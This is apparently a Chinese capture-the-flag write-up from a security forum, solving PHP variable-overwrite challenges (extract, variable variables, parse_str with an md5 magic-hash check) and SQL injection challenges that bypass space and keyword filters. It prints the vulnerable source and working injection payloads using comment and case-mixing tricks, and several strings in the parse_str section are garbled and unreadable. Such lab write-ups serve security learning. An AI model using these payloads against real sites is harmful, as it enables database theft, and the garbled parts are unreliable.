
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_C488EY9D2BKTWTW.png)

## 变量覆盖题
`flag{hunan_hetian}`

### 17、学会变量覆盖
#### 题目描述
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_M2X63ABRGC3U9XQ.png)

#### 查看源代码
```html
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<title>学会变量覆盖</title>
</head>
<body>
<!-- 
$flag='xxxx':
extract($_GET):
if (isset($gift))
$content=@trim(file_get_contents($flag)):
if ($gift=$content)
echo"flag"
else
echo ' oh . . ';
-->
</body>
</html>
```
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_FMT5RQ3QPHN34J2.png)

#### 分析
判断`$gift`变量是否存在，否则执行判断
`file_get_contents`读取`flag`传给`content`
判断`gift`是否等于`content`，如果等于`content`就输出`flag`
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_VR7636GHGDPBDRW.png)

#### 构造
构造`gift=&flag=`两个值都为空，判断相等
`flag{hetianlab}`

### 18、Easy php
#### 题目描述
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_MSVWR5678J6YFXW.png)

#### 源代码
```php
<?php
highlight_file('source.txt');
echo "<br><br>";
$flag = 'xxxxxxxx';
$msg_giveme = 'Give me the flag!';
$msg_getout = 'No this. Get out!';
if (!isset($_GET['flag']) && !isset($_POST['flag'])) {
    exit($msg_giveme);
}
if ($_POST['flag'] === 'flag' || $_GET['flag'] === 'flag') {
    exit($msg_getout);
}
foreach ($_POST as $key => $value) {
    $$key = $value;
}
foreach ($_GET as $key => $value) {
    $$key = $$value;
}
echo 'the flag is : ' . $flag;
?>
```
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_GVQ2C3T9CPE7MZR.png)
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_5NZG3KZ2SCRCFMM.png)
`flag{asdhetianlab}`

### 19、最后一道变量覆盖
#### 题目描述
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_FV66CFNGF44MBC8.png)

#### 源代码
```php
<?php
header("Content-Type: text/html;charset=utf-8");
error_reporting(0);
if (empty($_GET['id'])) {
    show_source(__FILE__);
    die();
} else {
    include ('flag.php');
    $a = "128K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3S2W2N6r3W2S2L8X3I4S2j5W2)9J5k6h3y4G2L8b7".". ";
    $id = $_GET['id'];
    @parse_str($id);
    if ($a[0] != 'QNKCDZO' && md5($a[0]) == md5('QNKCDZO')) {
        echo $flag;
    } else {
        exit('其实很简单其实并不难！');
    }
}
?>
```
#### 分析
`parse_str`导致的变量覆盖
#### Payload
`be0K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5H3i4K6u0W2x3g2)9J5k6e0q4Q4x3X3f1I4y4o6N6Q4x3@1p5#2x3o6t1H3i4K6u0r3i4K6y4r3K9h3c8Q4x3@1c8S2i4K6g2n7x3q4)9#2c8q4)9K6c8s2x3^5y4K6R3&6x3U0j5I4z5e0W2S2`
#### Php参考
`8b2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3P5r3S2V1M7#2)9J5c8Y4m8Q4x3V1j5I4x3U0f1^5y4K6t1@1z5g2)9J5k6h3S2@1L8h3I4Q4x3U0y4Q4y4h3k6D9j5h3u0W2L8o6t1`.
`6ebK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3P5r3S2V1M7#2)9J5c8Y4m8Q4x3V1j5I4x3U0x3@1z5e0p5^5z5g2)9J5k6h3S2@1L8h3H3`.

## SQL注入
### 20、你的空格哪去了
#### 题目描述
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_8YCH2XCQ6S4HGBA.png)
#### 访问网站
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_6CV48E3NYJDJQVR.png)
#### 简单的查询代码 输入1
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_GXXH4V5R6NGACK4.png)
#### 输入2
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_9RR37G7MH85WMVX.png)
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_C7KRQCJYVCWXAQ8.png)
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_A6GPAMZ9DEUHXNN.png)
提示`hacker`！可能过滤的`'`或者`and`等
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_8UUUYUNPAGWZFPG.png)
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_Q5ASCP3VZN5DCRQ.png)
没有提示`hacker`说明没有过滤单引号 根据标题发现可能过滤了空格
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_FKFKYU7HSHA7UXV.png)
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_STYV4936R2Y9KY3.png)
尝试`and`后也没有过滤`and`
首先`1'order/**/by/**/5#`
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_WCMKKRV6AV5NZS5.png)
发现没有信息 再尝试`1'order/**/by/**/3#`
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_QSDYSY86TVAWGWC.png)
然后使用`-1'union/**/select/**/1,2,3#`
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_QQPBF7FEU2RFTS5.png)
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_4FTVX98AJHAZ222.png)
然后看到我才会告诉你可以用`select flag from flag`看到`Flag`尝试
payload:`-1'union/**/select/**/1,2,flag/**/from/**/flag#`
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_EK357M26YECN9HP.png)
Flag: `flag{63564494cac7097c}`

### 21、想想怎么绕过过滤吧
#### 题目描述
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_FU3N5J6B92TWUFZ.png)
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_VT4EZMCF45Y8E3A.png)
打开发现跟21周的没什么区别 只是新增了`select`过滤
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_W46MWWEETNCYHKU.png)
直接大小写绕过即可
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_4TCSAT9MT2HEEGW.png)
![图片描述](https://bbs.kanxue.com/upload/attach/202011/809626_UU7J7K8MGKGR5FT.png)
Payload：`-1'union/**/SeLeCt/**/1,2,flag/**/from/**/flag#`
Flag：`flag{ff98f887ddaaad88}`

[传递专业知识、拓宽行业人脉——看雪讲师团队等你加入！！](https://bbs.kanxue.com/thread-275828.htm)
